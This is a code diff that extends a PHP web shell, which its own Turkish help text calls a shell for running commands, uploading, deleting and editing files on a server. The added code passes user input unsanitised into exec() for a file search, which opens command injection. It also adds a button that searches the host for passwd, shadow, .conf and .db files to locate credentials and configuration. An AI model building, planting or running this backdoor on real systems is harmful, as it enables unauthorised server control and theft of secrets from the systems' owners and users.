@@ -86,6 +86,48 @@ if (isset($_GET['duzenle'])) {
         });
     </script>";
 }
+function is_windows() {
+    return strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
+}
+
+if (isset($_POST['arama'])) {
+    $aranan = $_POST['aranan'];
+    $sonuclar = [];
+
+    if (is_windows()) {
+        $komut = "dir /S /B *$aranan* 2>NUL";
+    } else {
+        $komut = "find / -name *$aranan* 2>/dev/null";
+    }
+
+    exec($komut, $sonuclar);
+
+    if (!empty($sonuclar)) {
+        echo implode('<br>', array_map('htmlspecialchars', $sonuclar));
+    } else {
+        echo 'Hiçbir dosya veya klasör bulunamadı.';
+    }
+    exit;
+}
+
+if (isset($_POST['config_bul'])) {
+    $sonuclar = [];
+
+    if (is_windows()) {
+        $komut = "dir /S /B *passwd* *shadow* *.conf* *.db* 2>NUL";
+    } else {
+        $komut = "find /etc / -name '*.conf' -o -name '*.db' -o -name 'passwd' -o -name 'shadow' 2>/dev/null";
+    }
+
+    exec($komut, $sonuclar);
+
+    if (!empty($sonuclar)) {
+        echo implode('<br>', array_map('htmlspecialchars', $sonuclar));
+    } else {
+        echo 'Hiçbir konfigürasyon dosyası bulunamadı.';
+    }
+    exit;
+}
 
 function dizinListele($dizin) {
     if (realpath($dizin) != realpath('/')) {
@@ -280,6 +322,29 @@ $sistemBilgileri = [
                 <p><strong><?php echo $bilgi; ?>:</strong> <?php echo $deger; ?></p>
             <?php endforeach; ?>
         </div>
+        
+        <h3>Dosya Arama</h3>
+        <form id="aramaForm">
+            <input type="text" name="aranan" id="aranan" placeholder="Aranacak dosya veya klasör adı" />
+            <button type="button" class="btn" onclick="dosyaAra()">Ara</button>
+        </form>
+
+        <h3>Konfigürasyon Dosyası Tespiti</h3>
+        <form id="configForm">
+            <button type="button" class="btn" onclick="configBul()">Konfigürasyon Dosyalarını Bul</button>
+        </form>
+
+        <div id="aramaPopup" class="popup">
+            <h2>Arama Sonuçları</h2>
+            <div id="aramaSonuclari"></div><br>
+            <button onclick="aramaKapat()">Kapat</button>
+        </div>
+
+        <div id="configPopup" class="popup">
+            <h2>Konfigürasyon Dosyaları</h2>
+            <div id="configSonuclari"></div><br>
+            <button onclick="configKapat()">Kapat</button>
+        </div>
 
         <button class="yardim_buton" onclick="yardimAc()">Yardım</button>
 
@@ -287,11 +352,14 @@ $sistemBilgileri = [
             <h2>Yardım</h2>
             <p>Bu shell ile şunları yapabilirsiniz:</p>
             <ul>
-                <li>Komutlar çalıştırabilirsiniz.</li>
-                <li>Dosyalar yükleyebilirsiniz.</li>
-                <li>Klasörler oluşturabilirsiniz.</li>
-                <li>Dosyaları silebilir, düzenleyebilir ve yeniden adlandırabilirsiniz.</li>
-                <li>Üst dizine çıkmak için .. bağlantısına tıklayabilirsiniz.</li>
+                <li><strong>Komut çalıştırma:</strong> Shell komutlarını çalıştırmak için komut girin ve "Çalıştır" tuşuna basın.</li>
+                <li><strong>Dosya Yükleme:</strong> Bir dosya seçin ve yükleyin. Dosya sunucuya yüklenecektir.</li>
+                <li><strong>Klasör oluşturma:</strong> Yeni bir klasör oluşturmak için klasör adını girin ve "Oluştur" tuşuna basın.</li>
+                <li><strong>Dosya Silme:</strong> Dosyaları listede "Sil" butonuna tıklayarak silebilirsiniz.</li>
+                <li><strong>Dosya İndirme:</strong> Dosyaları indirmek için "İndir" butonuna basın.</li>
+                <li><strong>Dosya Düzenleme:</strong> Dosyaları düzenlemek için "Düzenle" butonuna tıklayın ve dosyanın içeriğini güncelleyin.</li>
+                <li><strong>Dosya Arama:</strong> Bir dosya adı girin ve sunucuda o dosyayı arayın.</li>
+                <li><strong>Konfigürasyon Dosyası Tespiti:</strong> Sistem konfigürasyon dosyalarını bulmak için "Konfigürasyon Dosyalarını Bul" butonunu kullanın.</li>
             </ul>
             <button onclick="yardimKapat()">Kapat</button>
         </div>
@@ -356,6 +424,53 @@ $sistemBilgileri = [
 
         function duzenlemeKapat() {
             document.getElementById("duzenlemePopup").style.display = "none";
+        }
+
+        function aramaKapat() {
+            document.getElementById("aramaPopup").style.display = "none";
+        }
+
+        function configKapat() {
+            document.getElementById("configPopup").style.display = "none";
+        }
+        function popupGoster(id) {
+            document.getElementById(id).style.display = 'block';
+        }
+
+        function popupKapat(id) {
+            document.getElementById(id).style.display = 'none';
+        }
+
+        function dosyaAra() {
+            var aranan = document.getElementById('aranan').value;
+            var formData = new FormData();
+            formData.append('arama', true);
+            formData.append('aranan', aranan);
+
+            fetch('', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.text())
+            .then(data => {
+                document.getElementById('aramaSonuclari').innerHTML = data;
+                popupGoster('aramaPopup');
+            });
+        }
+
+        function configBul() {
+            var formData = new FormData();
+            formData.append('config_bul', true);
+
+            fetch('', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.text())
+            .then(data => {
+                document.getElementById('configSonuclari').innerHTML = data;
+                popupGoster('configPopup');
+            });
         }
     </script>
 </html>
